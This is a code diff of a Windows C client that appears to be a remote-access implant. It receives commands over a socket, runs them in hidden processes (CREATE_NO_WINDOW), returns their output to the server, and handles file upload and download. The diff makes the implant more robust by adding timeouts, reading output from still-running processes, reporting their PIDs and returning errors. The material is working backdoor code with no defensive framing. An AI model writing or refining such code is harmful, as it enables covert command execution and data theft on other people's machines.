@@ -84,9 +84,8 @@ void messageHandler(SOCKET connectSocket) {
             memset(cmdBuffer, 0, expectedSize + sizeof(wchar_t));
             int received = 0;
             while (received < expectedSize) {
-                received += recv(connectSocket, (char*)(cmdBuffer) + received, expectedSize - received, 0);
+                received += recv(connectSocket, (char*)(cmdBuffer)+received, expectedSize - received, 0);
             }
-            //wprintf(L"Command: %ls\n", cmdBuffer);
 
             // RUNCMD and save output
             // Prepare full cmd to execute
@@ -97,7 +96,7 @@ void messageHandler(SOCKET connectSocket) {
             HANDLE hRead, hWrite;
             SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
             if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
-                free(cmdBuffer); 
+                free(cmdBuffer);
                 free(fullCmd);
                 break;
             }
@@ -112,28 +111,94 @@ void messageHandler(SOCKET connectSocket) {
             si.dwFlags = STARTF_USESTDHANDLES;
             if (CreateProcessW(NULL, fullCmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                 CloseHandle(hWrite);
+                hWrite = INVALID_HANDLE_VALUE;
+
+                // Wait up to 5 seconds for the process to finish
+                DWORD waitResult = WaitForSingleObject(pi.hProcess, 5000);
+
                 char tempBuf[1024];
                 DWORD bytesRead;
                 char* finalResult = NULL;
                 int totalResultSize = 0;
-                // Read from hRead and expand finalResult using realloc until ReadFile read all data
-                while (ReadFile(hRead, tempBuf, sizeof(tempBuf), &bytesRead, NULL) && bytesRead > 0) {
-                    char* newResult = (char*)realloc(finalResult, totalResultSize + bytesRead);
-                    if (newResult) {
-                        finalResult = newResult;
-                        memcpy(finalResult + totalResultSize, tempBuf, bytesRead);
-                        totalResultSize += bytesRead;
+
+                if (waitResult == WAIT_OBJECT_0) {
+                    // Process finished normally, read all output from pipe
+                    while (ReadFile(hRead, tempBuf, sizeof(tempBuf), &bytesRead, NULL) && bytesRead > 0) {
+                        char* newResult = (char*)realloc(finalResult, totalResultSize + bytesRead);
+                        if (newResult) {
+                            finalResult = newResult;
+                            memcpy(finalResult + totalResultSize, tempBuf, bytesRead);
+                            totalResultSize += bytesRead;
+                        }
                     }
                 }
-            // SEND Client -> Server: [4b opCode] [4b Size] [output]
+                else {
+                    // Process still running (timeout) then read whatever is available using PeekNamedPipe
+                    DWORD available = 0;
+                    if (PeekNamedPipe(hRead, NULL, 0, NULL, &available, NULL) && available > 0) {
+                        while (available > 0) {
+                            DWORD toRead = (available < sizeof(tempBuf)) ? available : sizeof(tempBuf);
+                            if (ReadFile(hRead, tempBuf, toRead, &bytesRead, NULL) && bytesRead > 0) {
+                                char* newResult = (char*)realloc(finalResult, totalResultSize + bytesRead);
+                                if (newResult) {
+                                    finalResult = newResult;
+                                    memcpy(finalResult + totalResultSize, tempBuf, bytesRead);
+                                    totalResultSize += bytesRead;
+                                }
+                                available -= bytesRead;
+                            }
+                            else break;
+                        }
+                    }
+                    // Send message telling user the process is still running
+                    const char* timeoutMsg = "\nProcess still running in background (PID: ";
+                    char pidStr[16];
+                    sprintf_s(pidStr, "%lu", pi.dwProcessId);
+                    const char* suffix = ")";
+
+                    int msgLen = (int)(strlen(timeoutMsg) + strlen(pidStr) + strlen(suffix));
+                    char* newResult = (char*)realloc(finalResult, totalResultSize + msgLen);
+                    if (newResult) {
+                        finalResult = newResult;
+                        memcpy(finalResult + totalResultSize, timeoutMsg, strlen(timeoutMsg));
+                        totalResultSize += (int)strlen(timeoutMsg);
+                        memcpy(finalResult + totalResultSize, pidStr, strlen(pidStr));
+                        totalResultSize += (int)strlen(pidStr);
+                        memcpy(finalResult + totalResultSize, suffix, strlen(suffix));
+                        totalResultSize += (int)strlen(suffix);
+                    }
+                }
+
+                // If no output at all send "no output"
+                if (totalResultSize == 0) {
+                    const char* noOutput = "\n#no output#";
+                    totalResultSize = (int)strlen(noOutput);
+                    finalResult = (char*)malloc(totalResultSize);
+                    memcpy(finalResult, noOutput, totalResultSize);
+                }
+
+                // SEND Client -> Server: [4b opCode] [4b Size] [output]
                 send(connectSocket, (char*)&opCode, sizeof(int), 0);
                 send(connectSocket, (char*)&totalResultSize, sizeof(int), 0);
                 send(connectSocket, finalResult, totalResultSize, 0);
+
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
                 free(finalResult);
             }
+            else {
+                // CreateProcess failed, send error back
+                CloseHandle(hWrite);
+                hWrite = INVALID_HANDLE_VALUE;
+                char errMsg[128];
+                sprintf_s(errMsg, "CreateProcess failed with error: %lu", GetLastError());
+                int errLen = (int)strlen(errMsg);
+                send(connectSocket, (char*)&opCode, sizeof(int), 0);
+                send(connectSocket, (char*)&errLen, sizeof(int), 0);
+                send(connectSocket, errMsg, errLen, 0);
+            }
 
+            if (hWrite != INVALID_HANDLE_VALUE) CloseHandle(hWrite);
             CloseHandle(hRead);
             free(cmdBuffer);
             free(fullCmd);
@@ -172,7 +237,7 @@ void messageHandler(SOCKET connectSocket) {
 
             CloseHandle(hFile);
             free(fileName);
-            
+
             break;
         }
         case UPLOAD: {
@@ -210,12 +275,14 @@ void messageHandler(SOCKET connectSocket) {
                     result = 1;
                     send(connectSocket, (char*)&resultSize, sizeof(int), 0);
                     send(connectSocket, (char*)&result, sizeof(int), 0);
-                } else {
+                }
+                else {
                     result = GetLastError();
                     send(connectSocket, (char*)&resultSize, sizeof(int), 0);
                     send(connectSocket, (char*)&result, sizeof(int), 0);
                 }
-            } else {
+            }
+            else {
                 result = GetLastError();
                 send(connectSocket, (char*)&resultSize, sizeof(int), 0);
                 send(connectSocket, (char*)&result, sizeof(int), 0);
@@ -229,7 +296,7 @@ void messageHandler(SOCKET connectSocket) {
             closesocket(connectSocket);
             return;
         default:
-            printf("opCode not sp");
+            // printf("opCode not sp");
             break;
         }
     }
